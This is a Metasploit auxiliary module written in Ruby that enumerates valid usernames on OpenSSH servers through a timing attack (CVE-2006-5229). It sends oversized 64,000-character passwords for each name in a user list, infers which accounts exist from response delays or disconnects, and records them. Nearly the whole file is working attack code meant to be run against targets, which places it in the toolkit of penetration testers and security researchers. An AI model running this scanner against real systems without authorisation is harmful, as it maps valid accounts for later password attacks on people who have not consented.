##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell

  attr_accessor :ssh_socket, :good_credentials

  THRESHOLD = 10

  def initialize
    super(
      'Name'        => 'SSH Username Enumeration',
      'Description' => %q{
        This module uses a time-based attack to enumerate users in a OpenSSH server.
      },
      'Author'      => ['kenkeiras'],
      'References'  =>
          [
            ['CVE', '2006-5229']
          ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('USER_FILE',
                      [true, 'File containing usernames, one per line', nil]),
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG',
                    [false, 'Enable SSH debugging output (Extreme verbosity!)',
                      false]),

        OptInt.new('SSH_TIMEOUT',
                   [false, 'Specify the maximum time to negotiate a SSH session',
                     10]),

        OptInt.new('RETRY_NUM',
                   [true , 'The number of attempts to connect to a SSH server' \
                     ' for each user', 3])
      ]
    )

    deregister_options('RHOST')
    @good_credentials = {}
  end


  def rport
    datastore['RPORT']
  end

  def retry_num
    datastore['RETRY_NUM']
  end


  def check_user(ip, user, port)
    pass = 'A' * 64_000

    opt_hash = {
      :auth_methods  => ['password', 'keyboard-interactive'],
      :msframework   => framework,
      :msfmodule     => self,
      :port          => port,
      :disable_agent => true,
      :password      => pass,
      :config        => false,
      :proxies       => datastore['Proxies']
    }

    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

    start_time = Time.new

    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh_socket = Net::SSH.start(ip, user, opt_hash)
      end

    rescue Rex::ConnectionError, Rex::AddressInUse
      return :connection_error

    rescue Net::SSH::Disconnect, ::EOFError
      return :success

    rescue ::Timeout::Error
      return :success

    rescue Net::SSH::Exception
    end

    finish_time = Time.new

    if finish_time - start_time > THRESHOLD
      return :success
    else
      return :fail
    end
  end


  def do_report(ip, user, port)
    report_auth_info(
      :host => ip,
      :port => rport,
      :sname => 'ssh',
      :user => user,
      :active => true
    )
  end


  def user_list
    return File.new(datastore['USER_FILE']).read.split
  end


  def attempt_user(user, ip)
    attempt_num = 0
    ret = nil

    while attempt_num <= retry_num and (ret.nil? or ret == :connection_error)

      if attempt_num > 0
        select(nil, nil, nil, 2**attempt_num)
        print_debug "Retrying '#{user}' on '#{ip}' due to connection error"
      end

      ret = check_user(ip, user, rport)
      attempt_num += 1
    end
    return ret
  end


  def show_result(attempt_result, user, ip)
    case attempt_result
    when :success
      print_good "User '#{user}' found on #{ip}"
      do_report(ip, user, rport)
      :next_user

    when :connection_error
      print_error "User '#{user}' on #{ip} could not connect"
      :abort

    when :fail
      print_debug "User '#{user}' not found on #{ip}"

    end
  end


  def run_host(ip)
    print_status "Starting scan on #{ip}"
    user_list.each{ |user| show_result(attempt_user(user, ip), user, ip) }
  end
end
